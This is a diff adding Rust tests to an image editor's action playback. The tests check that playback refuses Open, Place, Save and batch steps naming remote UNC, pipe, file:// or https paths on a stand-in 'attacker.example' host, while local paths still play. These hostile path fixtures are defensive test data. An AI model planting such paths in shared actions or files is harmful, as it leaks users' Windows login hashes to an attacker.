@@ -1322,3 +1322,66 @@ fn record_keeps_an_empty_loaded_sets_exact_name() {
     assert_eq!(crate::actions_edit_cmds::set_names(&s), [" Web "], "one folder, not a trimmed second one");
     assert_eq!(s.execute("actions.save", json!({"set": " Web "})).unwrap()["actions"], json!(["First"]));
 }
+
+/// A loaded action must not reach another computer. A `\\host\share` path in a played Open,
+/// Place or Save step sends Windows' login hash to that host, so playback refuses it before the
+/// step runs, whichever way it is played (an action, a script, a droplet or a batch).
+#[test]
+fn playback_refuses_steps_that_name_files_on_other_computers() {
+    let remote = [
+        ("file.openAs", json!({"path": r"\\attacker.example\share\x.psd"})),
+        ("file.placeLinked", json!({"path": "//attacker.example/share/y.png"})),
+        ("file.placeEmbedded", json!({"path": r"\\?\UNC\attacker.example\share\y.png"})),
+        ("file.saveAs", json!({"path": "file://attacker.example/share/out.psd"})),
+        ("file.saveACopy", json!({"path": r"\\.\pipe\x"})),
+        ("file.saveAs", json!({"folder": r"\\attacker.example\share", "extension": "psd"})),
+        ("file.openAs", json!({"path": "https://attacker.example/x.png"})),
+        ("file.batch", json!({"source": r"\\attacker.example\share", "files": [r"\\attacker.example\share\a.png"]})),
+    ];
+    let mut s = Session::new();
+    s.execute("file.new", json!({"width": 8, "height": 8})).unwrap();
+    for (id, params) in &remote {
+        let error = playback_params(&s, id, params).unwrap_err().to_string();
+        assert!(error.contains("not on this computer"), "{id} {params}: {error}");
+    }
+    // Played as an action, the step fails before it runs and playback stops there.
+    let steps = vec![("layer.new.layer".to_string(), json!({"name": "A"})), remote[0].clone().into_owned_step()];
+    s.actions.list.push(Action::new("Innocent", steps));
+    let played = s.execute("actions.play", json!({"action": 0})).unwrap();
+    assert_eq!(played["ran"], 1, "{played}");
+    assert!(played["failed"]["error"].as_str().unwrap().contains("not on this computer"), "{played}");
+    assert_eq!(s.documents().len(), 1, "no document was opened");
+}
+
+/// Local paths, relative paths and a path on the document's own share still play.
+#[test]
+fn playback_still_follows_local_paths() {
+    let mut s = Session::new();
+    s.execute("file.new", json!({"width": 8, "height": 8})).unwrap();
+    for (id, params) in [
+        ("file.openAs", json!({"path": "/tmp/photo.psd"})),
+        ("file.openAs", json!({"path": r"C:\Users\me\photo.psd"})),
+        ("file.saveAs", json!({"path": "out/photo.psd"})),
+        ("file.saveAs", json!({"folder": "/tmp/out", "extension": "psd"})),
+        ("layer.new.layer", json!({"name": r"\\not-a-path-key\share"})),
+    ] {
+        playback_params(&s, id, &params).unwrap_or_else(|e| panic!("{id} {params}: {e}"));
+    }
+    // A share path is a document path only on Windows (elsewhere it is a relative name).
+    #[cfg(windows)]
+    {
+        let on_share = std::path::Path::new(r"\\fileserver\team\poster.psd");
+        crate::doc_path::refuse_remote_step_paths("file.placeLinked", &json!({"path": r"\\FILESERVER\TEAM\logo.png"}), Some(on_share)).unwrap();
+        assert!(crate::doc_path::refuse_remote_step_paths("file.placeLinked", &json!({"path": r"\\other\team\logo.png"}), Some(on_share)).is_err());
+    }
+}
+
+trait IntoOwnedStep {
+    fn into_owned_step(self) -> (String, Value);
+}
+
+impl IntoOwnedStep for (&str, Value) {
+    fn into_owned_step(self) -> (String, Value) {
+        (self.0.to_string(), self.1)
+    }
+}
